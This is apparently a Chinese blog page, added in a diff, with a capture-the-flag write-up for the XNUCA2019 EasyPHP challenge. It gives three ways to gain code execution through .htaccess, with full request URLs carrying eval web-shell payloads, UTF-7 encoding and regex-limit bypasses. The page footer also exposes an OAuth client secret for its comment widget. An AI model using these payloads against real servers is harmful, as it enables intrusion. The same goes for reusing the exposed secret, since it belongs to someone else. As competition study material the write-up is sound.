@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>[XNUCA2019Qualifier]EasyPHP(.htaccess利用) |  </title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="[XNUCA2019Qualifier]EasyPHP(.htaccess利用) |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="[XNUCA2019Qualifier]EasyPHP(.htaccess利用)"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/xnuca2019qualifiereasyphphtaccess-li-yong/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            
+            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            
+        </span>
+            <h1>[XNUCA2019Qualifier]EasyPHP(.htaccess利用)</h1>
+            <span class="meta">
+            	Posted on
+              2020-02-01，6 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <pre><code>&lt;?php
+    $files = scandir('./'); 
+    foreach($files as $file) {
+        if(is_file($file)){
+            if ($file !== &quot;index.php&quot;) {
+                unlink($file);
+            }
+        }
+    }
+    include_once(&quot;fl3g.php&quot;);
+    if(!isset($_GET['content']) || !isset($_GET['filename'])) {
+        highlight_file(__FILE__);
+        die();
+    }
+    $content = $_GET['content'];
+    if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) {
+        echo &quot;Hacker&quot;;
+        die();
+    }
+    $filename = $_GET['filename'];
+    if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1) {
+        echo &quot;Hacker&quot;;
+        die();
+    }
+    $files = scandir('./'); 
+    foreach($files as $file) {
+        if(is_file($file)){
+            if ($file !== &quot;index.php&quot;) {
+                unlink($file);
+            }
+        }
+    }
+    file_put_contents($filename, $content . &quot;\nJust one chance&quot;);
+?&gt;
+</code></pre>
+<!-- more -->
+<p>代码量很少。作用如下:<br>
+1.访问index.php。就会删除当前目录下除了index.php的其他文件<br>
+2.包含fl3g.php<br>
+3.<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mrow></mrow><mi>G</mi></msub><mi>E</mi><mi>T</mi><msup><mo>[</mo><mo mathvariant="normal">′</mo></msup><mi>c</mi><mi>o</mi><mi>n</mi><mi>t</mi><mi>e</mi><mi>n</mi><msup><mi>t</mi><mo mathvariant="normal">′</mo></msup><mo>]</mo><mi mathvariant="normal">为</mi><mi mathvariant="normal">文</mi><mi mathvariant="normal">件</mi><mi mathvariant="normal">内</mi><mi mathvariant="normal">容</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">不</mi><mi mathvariant="normal">能</mi><mi mathvariant="normal">包</mi><mi mathvariant="normal">含</mi><mi>o</mi><mi>n</mi><mi mathvariant="normal">/</mi><mi>h</mi><mi>t</mi><mi>m</mi><mi>l</mi><mi mathvariant="normal">/</mi><mi>t</mi><mi>y</mi><mi>p</mi><mi>e</mi><mi mathvariant="normal">/</mi><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi><mi mathvariant="normal">/</mi><mi>u</mi><mi>p</mi><mi>l</mi><mi>o</mi><mi>a</mi><mi>d</mi><mi mathvariant="normal">/</mi><mi>f</mi><mi>i</mi><mi>l</mi><mi>e</mi><mi mathvariant="normal">这</mi><mi mathvariant="normal">几</mi><mi mathvariant="normal">个</mi><mi mathvariant="normal">字</mi><mi mathvariant="normal">符</mi><mn>4.</mn></mrow><annotation encoding="application/x-tex">_GET[&#x27;content&#x27;]为文件内容。不能包含on/html/type/flag/upload/file这几个字符
+4.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">G</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mopen"><span class="mopen">[</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord"><span class="mord mathdefault">t</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">]</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">文</span><span class="mord cjk_fallback">件</span><span class="mord cjk_fallback">内</span><span class="mord cjk_fallback">容</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">能</span><span class="mord cjk_fallback">包</span><span class="mord cjk_fallback">含</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord">/</span><span class="mord mathdefault">h</span><span class="mord mathdefault">t</span><span class="mord mathdefault">m</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord">/</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">p</span><span class="mord mathdefault">e</span><span class="mord">/</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord">/</span><span class="mord mathdefault">u</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord">/</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">几</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">字</span><span class="mord cjk_fallback">符</span><span class="mord">4</span><span class="mord">.</span></span></span></span>_GET['content']为文件名。只能为a-z.<br>
+5.重复执行1的操作<br>
+6.写入文件。并且追加\nxxxx字符串。用于污染</p>
+<pre><code>http://4e99d98b-7b83-426d-8826-a7affde09566.node3.buuoj.cn/?filename=a.php&amp;content=&lt;?php phpinfo();?&gt;
+可以成功写入a.php。但是这里将php以文件输出了。不知道为啥。
+</code></pre>
+<p><img src="https://guokeya.github.io/post-images/1580555971715.png" alt="" loading="lazy"><br>
+接着又想到.htaccess。可以指定文件以php运行。</p>
+<pre><code>思路就是写一个.htaccess。指定test文件以php运行
+然后写一个test文件。内容是php代码
+但是这里用不了。因为我们要生成两个文件。也就意味着访问两次index.php
+访问一次。就会清空一次。假设生成了.htaccess。当我们再去生成test时。htaccess就会被删除
+</code></pre>
+<p>接着思考。.htaccess还能干嘛。之前刷题时。记得.htaccess能自动包含文件</p>
+<pre><code>php_value auto_prepend_file  &quot;.htaccess&quot;
+</code></pre>
+<p>如果将php代码写入.htaccess。代码前注释。访问index.php。就会自动包含.htaccess中的恶意代码<br>
+由于是先包含。再执行php代码。所以我们的恶意代码先执行。再删除.htaccess。我们就能获得一次执行命令的机会</p>
+<pre><code>php_value auto_prepend_fi\
+le &quot;.htaccess&quot;
+#&lt;?php @eval($_GET['cmd']); ?&gt;\
+</code></pre>
+<p>由于php中过滤了file。我们用斜杠绕过。htaccess中斜杠。相当于Linux下的斜杠。可以将两条语句拼接。不会报错。最后生成如下</p>
+<pre><code>php_value auto_prepend_fi\le &quot;.htaccess&quot;
+#&lt;?php @eval($_GET['cmd']); ?&gt;\Just one chance
+</code></pre>
+<p>.htaccess中的#号将我们的恶意代码和污染的字符串都注释了。从而可以正常运行</p>
+<pre><code>filename=.htaccess&amp;content=php_value%20auto_prepend_fi\%0Ale%20%22.htaccess%22%0A%23%3C%3fphp%20%40eval(%24_GET[%27cmd%27])%3b%20%3f%3E\
+</code></pre>
+<p>这里%0a表示换行。并且URL编码一些特殊字符比如?#<br>
+<img src="https://guokeya.github.io/post-images/1580557589133.png" alt="" loading="lazy"><br>
+直接执行代码<br>
+<img src="https://guokeya.github.io/post-images/1580557722160.png" alt="" loading="lazy"><br>
+执行一次。就要重新生成一次.htaccess<br>
+<strong>第二种解法：</strong><br>
+利用.htaccess配合include(f13g.php)<br>
+由于.htaccess可以配置php的配置项。比如文件包含路径。日志路径等<br>
+这里就是利用.htaccess将错误日志保存为/tmp/f13g.php<br>
+然后利用.htaccess设置php include_path。设置包含路径为/tmp<br>
+那么包含f13g.php就不会在当前目录下包含文件。而是去/tmp下包含</p>
+<pre><code>首先。写第一个htaccess。设置错误日志保存为/tmp/fl3g.php
+并且使其报错将恶意代码写入日志
+?filename=.htaccess&amp;content=php_value error_log /tmp/fl3g.php%0aphp_value error_reporting 32767%0aphp_value include_path &quot;%2bADw%3fphp%20eval($_GET[1])%2bADs%20%2bAF8AXw-halt%2bAF8-compiler()%2bADs&quot;%0a%23 \
+</code></pre>
+<p>写入后。如下：</p>
+<pre><code>php_value error_log /tmp/fl3g.php
+php_value error_reporting 32767
+php_value include_path &quot;+ADw?php eval($_GET[1])+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;
+# \
+</code></pre>
+<p>设置php错误日志文件名为/tmp/fl3g.php<br>
+设置include_path=utf-7加密的php代码。因为日志写入的过程中。会将&lt;&gt;这些html编码<br>
+然后访问index.php<br>
+这里用我本地开启报错的环境。更明显<br>
+<img src="https://guokeya.github.io/post-images/1580561051398.png" alt="" loading="lazy"><br>
+可以看到。恶意代码已经写入了日志<br>
+<img src="https://guokeya.github.io/post-images/1580561100173.png" alt="" loading="lazy"><br>
+接下来写第二个htaccess。它的作用是UTF-7解码并且设置include_path。等会index.php包含fl3g.php的时候。就会包含/tmp/fl3g.php中解码的恶意代码</p>
+<pre><code>?filename=.htaccess&amp;content=php_value include_path &quot;/tmp&quot;%0aphp_value zend.multibyte 1%0aphp_value zend.script_encoding &quot;UTF-7&quot;%0a%23 \
+</code></pre>
+<p>直接构造exp的URL。访问index.php。会删除htaccess。导致不能包含fl3g.php<br>
+<img src="https://guokeya.github.io/post-images/1580561236230.png" alt="" loading="lazy"><br>
+访问完。htaccess就被删除了。又要重新生成一次<br>
+<strong>第三种解法（未实现）</strong><br>
+也是利用.htaccess.</p>
+<pre><code>    if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1) {
+        echo &quot;Hacker&quot;;
+        die();
+    }
+</code></pre>
+<p>这里使用preg_match匹配。而这个函数有一个prce回溯。这里只判断返回结果是否等于1.也就是True<br>
+而prce回溯是可以定义。超过回溯。就会返回False。也就是0<br>
+即可绕过正则。直接写入fl3g.php<br>
+然后文件包含利用。</p>
+<pre><code>php_value pcre.backtrack_limit 0
+php_value pcre.jit 0
+</code></pre>
+<p>请求<code>filename=fl3g.php&amp;content=&lt;?php phpinfo();?&gt;</code><br>
+访问index.php就好了<br>
+<img src="https://guokeya.github.io/post-images/1580561931510.png" alt="" loading="lazy"><br>
+这里我有一点想不通。首先。生成了fl3g.php<br>
+而访问index.php会删除index.php以外的文件。那么fl3g.php在include前就已经被删除了。又是怎么包含的。</p>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/jactfsawed/">
+              <span class="post-title">
+                [jactf]sawed&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br ><!--test--></a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
